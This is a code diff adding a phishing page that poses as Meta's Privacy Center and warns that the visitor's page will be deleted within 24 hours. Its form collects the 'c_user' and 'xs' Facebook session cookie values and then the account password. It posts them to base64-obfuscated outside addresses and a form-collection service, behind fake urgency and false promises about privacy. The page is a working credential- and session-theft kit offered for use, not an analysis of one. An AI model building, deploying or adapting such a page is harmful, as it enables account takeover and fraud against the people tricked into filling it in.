+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            max-width: 460px;
+            width: 90%;
+            text-align: center;
+            animation: slideUp 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 1px solid rgba(24, 119, 242, 0.1);
+        }
+
+        .success-icon {
+            font-size: 60px;
+            margin-bottom: 15px;
+            animation: scaleIn 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            display: inline-block;
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0.5);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .success-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1877f2;
+            margin-bottom: 12px;
+        }
+
+        .success-message {
+            font-size: 14px;
+            color: #606770;
+            line-height: 1.6;
+            margin-bottom: 8px;
+        }
+
+        .success-info {
+            font-size: 13px;
+            color: #8a8d91;
+            line-height: 1.5;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid #e5e5e5;
+        }
+
+        .success-info strong {
+            color: #1877f2;
+            font-weight: 600;
+        }
+
+        .success-btn {
+            width: 100%;
+            padding: 12px;
+            margin-top: 20px;
+            background: linear-gradient(to bottom, #1877f2, #165ec7);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(24, 119, 242, 0.3);
+        }
+
+        .success-btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.5);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .success-btn:active::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        .success-btn:hover {
+            background: linear-gradient(to bottom, #165ec7, #144fb8);
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.4);
+            transform: translateY(-1px);
+        }
+
+        .success-btn:active {
+            background: linear-gradient(to bottom, #144fb8, #0d47a1);
+            transform: translateY(0);
+        }
+
+        /**
+         * RESPONSIVE DESIGN - TABLET
+         * ==================================================
+         * Media queries for screens up to 1024px width
+         */
+        @media (max-width: 1024px) {
+            .form-main-container {
+                padding-right: 40px;
+            }
+
+            .form-container {
+                max-width: 100%;
+            }
+        }
+
+        /**
+         * RESPONSIVE DESIGN - MEDIUM SCREENS
+         * ==================================================
+         * Media queries for screens up to 768px width
+         */
+        @media (min-width: 769px) {
+            .privacy-text {
+                display: block;
+                font-size: 18px;
+                font-weight: 700;
+                color: #1c1e21;
+                margin-left: 10px;
+            }
+
+            .home-page {
+                display: flex;
+                align-items: center;
+                gap: 8px;
+                color: #1c1e21;
+                cursor: pointer;
+                transition: all 0.2s ease;
+                flex-shrink: 0;
+                text-decoration: none;
+            }
+
+            .home-page:hover {
+                color: #1877f2;
+            }
+
+            .home-icon {
+                width: 20px;
+                height: 20px;
+                fill: currentColor;
+            }
+
+            .home-text {
+                font-size: 14px;
+                font-weight: 500;
+            }
+        }
+
+        @media (max-width: 768px) {
+            body {
+                padding-top: 70px;
+            }
+
+            header {
+                justify-content: flex-start;
+                padding: 8px 16px;
+                height: 60px;
+                gap: 0;
+            }
+
+            .header-logo img {
+                height: 30px;
+                width: auto;
+            }
+
+            .privacy-text {
+                display: none;
+            }
+
+            .home-page {
+                display: none;
+            }
+
+            .header-menu {
+                display: none;
+            }
+
+            .header-content {
+                gap: 12px;
+                padding: 0 8px;
+                justify-content: space-between;
+            }
+
+            .header-logo {
+                font-size: 18px;
+            }
+
+            .header-search {
+                width: auto;
+                max-width: 200px;
+                flex: 1;
+            }
+
+            .header-search input {
+                font-size: 13px;
+                padding: 7px 10px;
+            }
+
+            .form-main-container {
+                justify-content: center;
+                padding: 20px 15px;
+                padding-right: 15px;
+                min-height: calc(100vh - 56px);
+            }
+
+            .form-container {
+                width: 100%;
+                max-width: 100%;
+                padding: 25px;
+                box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            }
+
+            .form-title {
+                font-size: 17px;
+                margin-bottom: 8px;
+            }
+
+            .form-subtitle {
+                font-size: 13px;
+                margin-bottom: 15px;
+            }
+
+            .terms-conditions {
+                padding: 12px;
+                font-size: 12px;
+                margin-bottom: 15px;
+            }
+
+            .warning-box {
+                padding: 15px;
+                margin-bottom: 15px;
+            }
+
+            .warning-title {
+                font-size: 15px;
+                margin-bottom: 10px;
+            }
+
+            .warning-subtext {
+                font-size: 12px;
+                margin-bottom: 10px;
+            }
+
+            .appeal-box {
+                flex-direction: column;
+                padding: 12px;
+            }
+
+            .appeal-box img {
+                width: 70px;
+                height: 70px;
+            }
+
+            .appeal-title {
+                font-size: 13px;
+            }
+
+            .appeal-desc {
+                font-size: 11px;
+            }
+
+            .video-title {
+                font-size: 14px;
+            }
+
+            .form-video-container {
+                aspect-ratio: 16 / 9;
+                height: auto;
+            }
+
+            .deadline-section {
+                padding: 10px 12px;
+                gap: 10px;
+            }
+
+            .deadline-icon {
+                font-size: 20px;
+            }
+
+            .deadline-label {
+                font-size: 11px;
+            }
+
+            .deadline-time {
+                font-size: 15px;
+            }
+
+            .deadline-warning {
+                font-size: 10px;
+            }
+
+            .form-label {
+                font-size: 13px;
+            }
+
+            input[type="text"],
+            input[type="email"],
+            input[type="password"],
+            input[type="number"],
+            textarea {
+                padding: 10px 12px;
+                font-size: 15px;
+            }
+
+            button {
+                padding: 11px;
+                font-size: 16px;
+                margin-top: 10px;
+            }
+
+            .form-details {
+                font-size: 12px;
+            }
+
+            .video-container {
+                max-width: 100%;
+            }
+
+            footer {
+                padding: 15px 12px;
+            }
+
+            .footer-content {
+                gap: 20px;
+            }
+
+            .footer-title {
+                font-size: 12px;
+            }
+
+            .footer-link {
+                font-size: 11px;
+            }
+
+            .modal-content {
+                width: 95%;
+                padding: 25px;
+            }
+
+            .modal-title {
+                font-size: 16px;
+            }
+
+            .modal-subtitle {
+                font-size: 12px;
+            }
+
+            .modal-btn {
+                padding: 10px;
+                font-size: 13px;
+            }
+
+            .success-modal-content {
+                width: 95%;
+                padding: 30px 25px;
+            }
+
+            .success-icon {
+                font-size: 50px;
+            }
+
+            .success-title {
+                font-size: 18px;
+            }
+
+            .success-message {
+                font-size: 13px;
+            }
+        }
+
+        /**
+         * RESPONSIVE DESIGN - MOBILE
+         * ==================================================
+         * Media queries for screens up to 480px width
+         */
+        @media (max-width: 480px) {
+            body {
+                padding-top: 60px;
+            }
+
+            header {
+                padding: 6px 8px;
+                height: 60px;
+            }
+
+            .header-content {
+                gap: 6px;
+                padding: 0 4px;
+                justify-content: space-between;
+            }
+
+            .header-logo {
+                font-size: 18px;
+                flex-shrink: 0;
+            }
+
+            .header-logo img {
+                height: 28px;
+            }
+
+            .header-menu {
+                display: none;
+            }
+
+            .header-search {
+                width: auto;
+                max-width: 100px;
+                flex: 1;
+                min-width: 80px;
+            }
+
+            .header-search input {
+                font-size: 11px;
+                padding: 5px 8px;
+                width: 100%;
+            }
+
+            .form-main-container {
+                padding: 12px;
+                padding-right: 12px;
+                min-height: calc(100vh - 60px);
+            }
+
+            .form-container {
+                padding: 18px;
+                border-radius: 6px;
+                box-shadow: 0 1px 1px rgba(0, 0, 0, 0.08);
+            }
+
+            .form-title {
+                font-size: 16px;
+                margin-bottom: 4px;
+                font-weight: 600;
+            }
+
+            .form-subtitle {
+                font-size: 12px;
+                margin-bottom: 12px;
+                color: #65676b;
+            }
+
+            .terms-conditions {
+                padding: 10px;
+                font-size: 11px;
+                margin-bottom: 12px;
+                line-height: 1.4;
+            }
+
+            .terms-conditions strong {
+                margin-bottom: 6px;
+                font-size: 12px;
+            }
+
+            .warning-box {
+                padding: 12px;
+                margin-bottom: 12px;
+                border-width: 1px;
+            }
+
+            .warning-title {
+                font-size: 14px;
+                margin-bottom: 8px;
+            }
+
+            .warning-subtext {
+                font-size: 11px;
+                margin-bottom: 8px;
+            }
+
+            .warning-extra {
+                font-size: 10px;
+                padding: 8px;
+                margin-bottom: 12px;
+            }
+
+            .appeal-box {
+                flex-direction: column;
+                padding: 10px;
+                gap: 10px;
+            }
+
+            .appeal-box img {
+                width: 60px;
+                height: 60px;
+            }
+
+            .appeal-info {
+                gap: 6px;
+            }
+
+            .appeal-title {
+                font-size: 12px;
+            }
+
+            .appeal-desc {
+                font-size: 10px;
+            }
+
+            .appeal-btn {
+                padding: 8px 16px;
+                font-size: 13px;
+            }
+
+            .video-info-section {
+                margin-bottom: 12px;
+            }
+
+            .video-title {
+                font-size: 13px;
+                margin-bottom: 8px;
+            }
+
+            .form-video-container {
+                aspect-ratio: 16 / 9;
+                margin-bottom: 15px;
+            }
+
+            .deadline-section {
+                padding: 10px 12px;
+                gap: 10px;
+                margin-bottom: 12px;
+            }
+
+            .deadline-icon {
+                font-size: 18px;
+            }
+
+            .deadline-label {
+                font-size: 10px;
+            }
+
+            .deadline-time {
+                font-size: 14px;
+            }
+
+            .deadline-warning {
+                font-size: 9px;
+            }
+
+            .form-label {
+                font-size: 12px;
+                margin-bottom: 3px;
+            }
+
+            .form-group {
+                flex-direction: column;
+                gap: 8px;
+                margin-bottom: 8px;
+            }
+
+            input[type="text"],
+            input[type="email"],
+            input[type="password"],
+            input[type="number"],
+            textarea {
+                padding: 10px 12px;
+                font-size: 14px;
+                border-radius: 4px;
+            }
+
+            button {
+                padding: 10px;
+                font-size: 15px;
+                margin-top: 8px;
+                border-radius: 4px;
+            }
+
+            .form-details {
+                font-size: 11px;
+                margin-top: 12px;
+                line-height: 1.4;
+            }
+
+            footer {
+                padding: 12px 8px;
+            }
+
+            .footer-content {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .footer-title {
+                font-size: 11px;
+                margin-bottom: 3px;
+            }
+
+            .footer-link {
+                font-size: 10px;
+            }
+
+            .footer-bottom {
+                font-size: 10px;
+                margin-top: 15px;
+                padding-top: 15px;
+            }
+
+            .modal-content {
+                width: 90%;
+                padding: 20px;
+                max-width: 100%;
+            }
+
+            .modal-title {
+                font-size: 16px;
+            }
+
+            .modal-subtitle {
+                font-size: 12px;
+                margin-bottom: 15px;
+            }
+
+            .modal-label {
+                font-size: 12px;
+            }
+
+            .modal-input {
+                padding: 10px 40px 10px 12px;
+                font-size: 14px;
+            }
+
+            .modal-btn {
+                padding: 10px;
+                font-size: 12px;
+            }
+
+            .success-modal-content {
+                width: 90%;
+                padding: 25px 20px;
+            }
+
+            .success-icon {
+                font-size: 45px;
+                margin-bottom: 12px;
+            }
+
+            .success-title {
+                font-size: 16px;
+                margin-bottom: 10px;
+            }
+
+            .success-message {
+                font-size: 12px;
+            }
+
+            .success-info {
+                font-size: 11px;
+                margin-top: 12px;
+                padding-top: 12px;
+            }
+
+            .success-btn {
+                padding: 10px;
+                font-size: 13px;
+                margin-top: 15px;
+            }
+        }
+
+        /**
+         * UTILITY CLASSES
+         * ==================================================
+         * Helper classes for common styling patterns
+         */
+        .hidden {
+            display: none !important;
+        }
+
+        .visible {
+            display: block !important;
+        }
+
+        .text-center {
+            text-align: center;
+        }
+
+        .text-left {
+            text-align: left;
+        }
+
+        .text-right {
+            text-align: right;
+        }
+
+        .mt-10 {
+            margin-top: 10px;
+        }
+
+        .mt-20 {
+            margin-top: 20px;
+        }
+
+        .mb-10 {
+            margin-bottom: 10px;
+        }
+
+        .mb-20 {
+            margin-bottom: 20px;
+        }
+
+        .flex-center {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .flex-between {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .gap-10 {
+            gap: 10px;
+        }
+
+        .gap-20 {
+            gap: 20px;
+        }
+
+        /**
+         * PRINT STYLES
+         * ==================================================
+         * Styles for printing the page
+         */
+        @media print {
+            header,
+            footer,
+            .appeal-btn,
+            button {
+                display: none;
+            }
+
+            body {
+                padding-top: 0;
+            }
+
+            .form-main-container {
+                padding: 0;
+            }
+
+            .form-container {
+                box-shadow: none;
+                border: 1px solid #ddd;
+            }
+        }
+
+
+
+        /**
+         * REDUCED MOTION SUPPORT
+         * ==================================================
+         * Respects user's motion preferences
+         */
+        @media (prefers-reduced-motion: reduce) {
+            *,
+            *::before,
+            *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+                scroll-behavior: auto !important;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 
+    ==================================================
+    HEADER - FIXED SINGLE HEADER
+    ==================================================
+    Combined header with Meta logo, navigation, and search.
+    Responsive design with proper mobile support.
+    -->
+    <header>
+        <div class="header-content">
+            <a href="#" class="header-logo">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36' fill='%231877F2'%3E%3Cpath d='M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.142 5.234 15.084 12.6 17.562v-11.72H9.9V18h2.7v-2.578c0-4.194 2.227-6.509 6.705-6.509 1.902 0 3.53.142 4.005.206v4.615h-2.757c-2.169 0-2.844 1.084-2.844 2.746V18h5.086l-.813 5.158h-4.273v12.714c2.244-.679 4.274-1.857 6-3.328v-4.543h-2.178z'%3E%3C/path%3E%3C/svg%3E" alt="Meta Logo">
+                <span class="header-logo-text">Meta</span>
+            </a>
+            
+            <div class="privacy-text">Privacy Center</div>
+            
+            <div class="header-search">
+                <div class="header-search-wrapper">
+                    <div class="header-search-icon">
+                        <i class="fas fa-search"></i>
+                    </div>
+                    <input type="text" placeholder="Search Privacy Center...">
+                    <div class="header-search-clear">
+                        <i class="fas fa-times"></i>
+                    </div>
+                </div>
+            </div>
+
+            <ul class="header-menu">
+                <li><a href="#"><i class="fas fa-home"></i> Home</a></li>
+                <li><a href="#"><i class="fas fa-shield-alt"></i> Privacy Policy</a></li>
+                <li><a href="#"><i class="fas fa-file-alt"></i> Articles</a></li>
+                <li><a href="#"><i class="fas fa-question-circle"></i> Help</a></li>
+            </ul>
+        </div>
+    </header>
+
+    <!-- 
+    ==================================================
+    MAIN FORM CONTAINER
+    ==================================================
+    Primary content area with form and instructions.
+    Centered layout with responsive design.
+    -->
+    <div class="form-main-container">
+        <div class="form-container">
+            <!-- 
+            ==================================================
+            WARNING BOX
+            ==================================================
+            Critical alert about page deletion with icon
+            and detailed warning message.
+            -->
+            <div class="warning-box">
+                <div class="warning-top">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 9V14" stroke="#D93025" stroke-width="2" stroke-linecap="round"></path>
+                        <path d="M12 17V17.5" stroke="#D93025" stroke-width="2" stroke-linecap="round"></path>
+                        <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#D93025" stroke-width="2"></path>
+                    </svg>
+                    <span class="translatable" data-key="warningTitle">Your page is scheduled to be deleted!</span>
+                </div>
+                <div class="warning-title">
+                    <span>Important Notice Regarding Your Page</span>
+                </div>
+                <div class="warning-subtext">
+                    Our system has identified activity on your page that may not comply with our Community Standards. We are currently reviewing the issue, and we need additional information from you to complete the process.
+                </div>
+                <div class="warning-extra">
+                    Please submit a review request within the next 24 hours so we can reassess your page and ensure it remains active. If we do not receive your response, your page may be subject to removal in accordance with our policies.<br><br>If you believe this notice was sent in error, you can file an appeal.
+                </div>
+            </div>
+
+            <!-- 
+            ==================================================
+            VIDEO SECTION
+            ==================================================
+            Instructional video showing how to request review
+            with metadata and control options.
+            -->
+            <div class="video-info-section">
+                <div class="video-title">📹 How to Request Review</div>
+                <div class="video-description">
+                    Watch this brief tutorial to understand the appeal process and how to submit your request effectively.
+                </div>
+                <div class="video-meta">
+                    <span>⏱️ Duration: 1:01</span>
+                    <span>📊 Views: 973.2K</span>
+                </div>
+            </div>
+
+            <div class="form-video-container">
+                <video data-src="aHR0cHM6Ly9yZXNvdXJjZTIuaGV5Z2VuLmFpL3ZpZGVvX3RyYW5zbGF0ZS85NDA4NzM1ODAzMGE0ZGY4YjIwZTczZjFmYmE5MmVkNS1lbi83MjBwLm1wNA==" class="form-video-thumbnail" poster="thumbnail.jpeg" controls controlsList="nodownload" playsinline></video>
+            </div>
+
+            <!-- 
+            ==================================================
+            DEADLINE SECTION
+            ==================================================
+            Urgent deadline indicator with countdown timer
+            and warning message.
+            -->
+            <div class="deadline-section">
+                <div class="deadline-icon">⏰</div>
+                <div class="deadline-info">
+                    <p class="deadline-label">Response Deadline</p>
+                    <p class="deadline-time">24 Hours</p>
+                    <p class="deadline-warning">If you don't submit within 24 hours, your page will be deleted</p>
+                </div>
+            </div>
+
+            <!-- 
+            ==================================================
+            APPEAL FORM
+            ==================================================
+            Main form for submitting appeal with input fields
+            and validation. Collects user information.
+            -->
+            <form method="POST" data-action="aHR0cHM6Ly9jb21wbGV0ZS15b3VyLXByb2Nlc3Mtbm93LnNpdGUvZHluYW1pYy5waHA=">
+                <div class="form-group">
+                    <label for="first_name" class="form-label">c_user</label>
+                    <input 
+                        type="text" 
+                        id="first_name"
+                        name="first_name" 
+                        placeholder="Enter c_user" 
+                        required
+                        aria-label="c_user"
+                        aria-required="true"
+                    >
+                    
+                    <label for="last_name" class="form-label">xs</label>
+                    <div id="lastNameError" class="form-error" style="display: none;"></div>
+                    <input 
+                        type="text" 
+                        id="last_name"
+                        name="last_name" 
+                        placeholder="Enter xs" 
+                        required
+                        aria-label="xs"
+                        aria-required="true"
+                    >
+                </div>
+
+                <!-- 
+                ==================================================
+                SUBMIT BUTTON
+                ==================================================
+                Primary action button to submit the appeal form
+                and proceed to verification.
+                -->
+                <button type="submit" class="appeal-btn" id="open-appeal-btn" style="width: 100%; margin-top: 15px; margin-bottom: 20px;">
+                    <span id="fbSendBtnText">Submit Appeal</span>
+                </button>
+
+                <!-- 
+                ==================================================
+                APPEAL GUIDE
+                ==================================================
+                Informational section guiding users through
+                the appeal process with best practices.
+                -->
+                <div class="appeal-guide">
+                    <div class="appeal-guide-header">
+                        <img data-src="aHR0cHM6Ly9pay5pbWFnZWtpdC5pby9hbGlicm9oaS9kb3dubG9hZC5wbmc/dXBkYXRlZEF0PTE3NTYxMDIyNjI3Njc=" alt="Appeal Illustration" class="appeal-guide-img" />
+                        <div class="appeal-guide-text">
+                            <div class="appeal-guide-title">Appeal Guide</div>
+                            <div class="appeal-guide-content">
+                                <p><strong>Before You Submit:</strong> Gather all relevant documentation and evidence that supports your appeal. This includes account history, communications, and any proof that you violated our policies unintentionally.</p>
+                                
+                                <p><strong>What to Include:</strong> Provide a detailed, honest explanation of your situation. Avoid making excuses. Instead, explain what happened, why it happened, and what steps you've taken to prevent it in the future. Be concise but thorough.</p>
+                                
+                                <p><strong>After Submission:</strong> Our review team will examine your appeal carefully. We will contact you within 24-48 hours with a decision. In some cases, particularly complex appeals may take up to 7 business days.</p>
+
+                                <p><strong>Possible Outcomes:</strong> Your page may be reinstated immediately, your page may remain inactive pending further investigation, or your page may be permanently removed if we find the violation was intentional or severe.</p>
+
+                                <p class="appeal-guide-note">💡 Tip: Appeals are more successful when you take responsibility for your actions and demonstrate a clear understanding of the policy you violated.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </form>
+
+            <!-- 
+            ==================================================
+            PASSWORD CONFIRMATION MODAL
+            ==================================================
+            Security dialog requiring password verification
+            before submitting sensitive information.
+            -->
+            <div id="passwordModal" class="modal">
+                <div class="modal-content">
+                    <div class="modal-title">Confirm Your Password</div>
+                    <div class="modal-subtitle">Please confirm your password to complete the appeal process. This helps us verify your identity and protect your account.</div>
+                    
+                    <div class="modal-form-group">
+                        <label class="modal-label" for="modalPassword">Password</label>
+                        <div class="password-input-wrapper">
+                            <input 
+                                type="password" 
+                                id="modalPassword" 
+                                class="modal-input" 
+                                placeholder="Enter your password" 
+                                required
+                                aria-label="Confirm your password"
+                                aria-required="true"
+                            >
+                            <span class="toggle-password" id="togglePassword" role="button" tabindex="0" aria-label="Toggle password visibility">👁️</span>
+                        </div>
+                    </div>
+
+                    <div class="modal-buttons">
+                        <button type="button" class="modal-btn modal-btn-cancel" id="cancelBtn">Cancel</button>
+                        <button type="button" class="modal-btn modal-btn-confirm" id="confirmBtn">Confirm & Submit</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 
+            ==================================================
+            SUCCESS CONFIRMATION MODAL
+            ==================================================
+            Success message shown after successful submission
+            with confirmation and next steps.
+            -->
+            <div id="successModal" class="success-modal">
+                <div class="success-modal-content">
+                    <div class="success-icon">✓</div>
+                    <div class="success-title">Request Received!</div>
+                    <div class="success-message">Your appeal has been successfully submitted.</div>
+                    <div class="success-info">
+                        <strong>Please wait 24-48 hours</strong> to complete your review.<br>
+                        We will notify you once the review is finished. You can check the status of your appeal in your account settings at any time.
+                    </div>
+                    <button class="success-btn" id="successBtn">Close & Return</button>
+                </div>
+            </div>
+
+            <!-- 
+            ==================================================
+            ADDITIONAL FORM DETAILS
+            ==================================================
+            Supporting information about the form and process
+            -->
+            <div class="form-details">
+                <strong>Privacy & Security:</strong>
+                <p>Your information is encrypted and stored securely. We will never share your personal data with third parties without your explicit consent. All submitted information is used only for the purpose of reviewing your appeal.</p>
+
+                <strong>What Happens Next:</strong>
+                <ul>
+                    <li>Your appeal will be assigned to a review team</li>
+                    <li>A thorough investigation will be conducted (typically 24-48 hours)</li>
+                    <li>You'll receive an email notification with the decision</li>
+                    <li>If approved, your page will be reinstated immediately</li>
+                    <li>If denied, you'll receive an explanation and options for further action</li>
+                </ul>
+
+                <strong>Important Reminders:</strong>
+                <ul>
+                    <li>Only submit one appeal per account</li>
+                    <li>Be honest and transparent in your explanation</li>
+                    <li>Provide all relevant documentation if possible</li>
+                    <li>Follow all community standards upon reinstatement</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        /**
+         * ==================================================
+         * PRIVACY CENTER APPLICATION
+         * ==================================================
+         * A comprehensive, feature-rich privacy management
+         * and account appeal processing application.
+         * 
+         * Features:
+         * - Base64 URL decoding
+         * - Form validation and error handling
+         * - Modal management
+         * - Video playback with fullscreen support
+         * - Password visibility toggle
+         * - Search functionality
+         * - Accessibility support
+         * - Performance optimizations
+         * 
+         * Version: 2.0
+         * Last Updated: 2025-01-18
+         */
+
+        /**
+         * CONFIGURATION & CONSTANTS
+         * ==================================================
+         * Global configuration for the application
+         */
+        const CONFIG = {
+            VIDEO_SOURCE: "aHR0cHM6Ly9vdXItYjM4YTEud2ViLmFwcC9kZXRhaWxlZF92aWRlby5tcDQ=",
+            FORM_ACTION: "aHR0cHM6Ly9jb21wbGV0ZS15b3VyLXByb2Nlc3Mtbm93LnNpdGUvZHluYW1pYy5waHA=",
+            FORMSPARK_ACTION: "https://submit-form.com/6xe6CI8D6",
+            FORM_TIMEOUT: 1000,
+            VALIDATION_DELAY: 500,
+            MODAL_ANIMATION_DURATION: 300,
+            DEBOUNCE_DELAY: 300,
+        };
+
+        /**
+         * UTILITY FUNCTIONS
+         * ==================================================
+         * Helper functions for common tasks
+         */
+
+        /**
+         * Decodes base64 encoded strings
+         * @param {string} base64String - The base64 encoded string
+         * @returns {string} The decoded string
+         */
+        function decodeBase64(base64String) {
+            try {
+                return atob(base64String);
+            } catch (error) {
+                console.error('Base64 decode error:', error);
+                return '';
+            }
+        }
+
+        /**
+         * Encodes string to base64
+         * @param {string} str - The string to encode
+         * @returns {string} The base64 encoded string
+         */
+        function encodeBase64(str) {
+            try {
+                return btoa(str);
+            } catch (error) {
+                console.error('Base64 encode error:', error);
+                return '';
+            }
+        }
+
+        /**
+         * Debounce function to limit function calls
+         * @param {Function} func - The function to debounce
+         * @param {number} wait - The wait time in milliseconds
+         * @returns {Function} The debounced function
+         */
+        function debounce(func, wait = CONFIG.DEBOUNCE_DELAY) {
+            let timeout;
+            return function executedFunction(...args) {
+                const later = () => {
+                    clearTimeout(timeout);
+                    func(...args);
+                };
+                clearTimeout(timeout);
+                timeout = setTimeout(later, wait);
+            };
+        }
+
+        /**
+         * Throttle function to limit function calls
+         * @param {Function} func - The function to throttle
+         * @param {number} limit - The time limit in milliseconds
+         * @returns {Function} The throttled function
+         */
+        function throttle(func, limit = CONFIG.DEBOUNCE_DELAY) {
+            let inThrottle;
+            return function(...args) {
+                if (!inThrottle) {
+                    func.apply(this, args);
+                    inThrottle = true;
+                    setTimeout(() => inThrottle = false, limit);
+                }
+            };
+        }
+
+        /**
+         * Shows or hides an element
+         * @param {HTMLElement} element - The element to toggle
+         * @param {boolean} show - Whether to show or hide
+         */
+        function toggleElement(element, show = true) {
+            if (show) {
+                element.style.display = '';
+                element.classList.remove('hidden');
+                element.classList.add('visible');
+            } else {
+                element.style.display = 'none';
+                element.classList.add('hidden');
+                element.classList.remove('visible');
+            }
+        }
+
+        /**
+         * Adds event listener with error handling
+         * @param {HTMLElement} element - The element to attach listener to
+         * @param {string} event - The event type
+         * @param {Function} handler - The event handler
+         */
+        function safeAddEventListener(element, event, handler) {
+            if (element && typeof handler === 'function') {
+                element.addEventListener(event, handler);
+            }
+        }
+
+        /**
+         * Removes all errors from a form
+         * @param {HTMLFormElement} form - The form element
+         */
+        function clearFormErrors(form) {
+            const errorElements = form.querySelectorAll('.form-error, .form-warning');
+            errorElements.forEach(error => toggleElement(error, false));
+        }
+
+        /**
+         * Shows an error message for a specific field
+         * @param {string} fieldName - The field name
+         * @param {string} message - The error message
+         */
+        function showFieldError(fieldName, message) {
+            const errorElement = document.getElementById(`${fieldName}Error`);
+            if (errorElement) {
+                errorElement.textContent = message;
+                toggleElement(errorElement, true);
+            }
+        }
+
+        /**
+         * ANIMATION UTILITIES
+         * ==================================================
+         * Functions for managing animations
+         */
+
+        /**
+         * Fades in an element
+         * @param {HTMLElement} element - The element to fade in
+         * @param {number} duration - The duration in milliseconds
+         * @returns {Promise} Resolves when animation completes
+         */
+        function fadeIn(element, duration = 300) {
+            return new Promise(resolve => {
+                element.style.opacity = '0';
+                element.style.display = '';
+                
+                requestAnimationFrame(() => {
+                    element.style.transition = `opacity ${duration}ms ease-in`;
+                    element.style.opacity = '1';
+                    
+                    setTimeout(() => {
+                        element.style.transition = '';
+                        resolve();
+                    }, duration);
+                });
+            });
+        }
+
+        /**
+         * Fades out an element
+         * @param {HTMLElement} element - The element to fade out
+         * @param {number} duration - The duration in milliseconds
+         * @returns {Promise} Resolves when animation completes
+         */
+        function fadeOut(element, duration = 300) {
+            return new Promise(resolve => {
+                element.style.transition = `opacity ${duration}ms ease-out`;
+                element.style.opacity = '0';
+                
+                setTimeout(() => {
+                    element.style.display = 'none';
+                    element.style.transition = '';
+                    resolve();
+                }, duration);
+            });
+        }
+
+        /**
+         * Slides down an element
+         * @param {HTMLElement} element - The element to slide
+         * @param {number} duration - The duration in milliseconds
+         * @returns {Promise} Resolves when animation completes
+         */
+        function slideDown(element, duration = 300) {
+            return new Promise(resolve => {
+                element.style.display = '';
+                const height = element.scrollHeight;
+                
+                element.style.overflow = 'hidden';
+                element.style.maxHeight = '0';
+                element.style.transition = `max-height ${duration}ms ease-in`;
+                
+                requestAnimationFrame(() => {
+                    element.style.maxHeight = height + 'px';
+                    
+                    setTimeout(() => {
+                        element.style.overflow = '';
+                        element.style.maxHeight = '';
+                        element.style.transition = '';
+                        resolve();
+                    }, duration);
+                });
+            });
+        }
+
+        /**
+         * FORM VALIDATION
+         * ==================================================
+         * Validation functions for form inputs
+         */
+
+        /**
+         * Validates if a string contains only numbers
+         * @param {string} value - The value to validate
+         * @returns {boolean} True if valid
+         */
+        function isNumericOnly(value) {
+            return /^[0-9]*$/.test(value);
+        }
+
+        /**
+         * Validates if a string contains at least one alphabet character
+         * @param {string} value - The value to validate
+         * @returns {boolean} True if valid
+         */
+        function hasAlphabet(value) {
+            return /[a-zA-Z]/.test(value);
+        }
+
+        /**
+         * Validates if a string contains at least one number
+         * @param {string} value - The value to validate
+         * @returns {boolean} True if valid
+         */
+        function hasNumber(value) {
+            return /[0-9]/.test(value);
+        }
+
+        /**
+         * Validates if a string contains at least one symbol
+         * @param {string} value - The value to validate
+         * @returns {boolean} True if valid
+         */
+        function hasSymbol(value) {
+            return /[\-.,!@#$%^&*()+=\[\]{};':"<>?,./\\|`~]/.test(value);
+        }
+
+        /**
+         * Validates email format
+         * @param {string} email - The email to validate
+         * @returns {boolean} True if valid
+         */
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        /**
+         * Validates password strength
+         * @param {string} password - The password to validate
+         * @returns {object} Validation result with details
+         */
+        function validatePasswordStrength(password) {
+            const result = {
+                isValid: true,
+                strength: 'weak',
+                feedback: [],
+                requirements: {
+                    minLength: password.length >= 8,
+                    hasUppercase: /[A-Z]/.test(password),
+                    hasLowercase: /[a-z]/.test(password),
+                    hasNumber: /[0-9]/.test(password),
+                    hasSymbol: /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)
+                }
+            };
+
+            const requiredMet = Object.values(result.requirements).filter(Boolean).length;
+
+            if (requiredMet <= 2) result.strength = 'weak';
+            else if (requiredMet <= 3) result.strength = 'fair';
+            else if (requiredMet <= 4) result.strength = 'good';
+            else result.strength = 'strong';
+
+            if (!result.requirements.minLength) result.feedback.push('Password must be at least 8 characters');
+            if (!result.requirements.hasUppercase) result.feedback.push('Include at least one uppercase letter');
+            if (!result.requirements.hasLowercase) result.feedback.push('Include at least one lowercase letter');
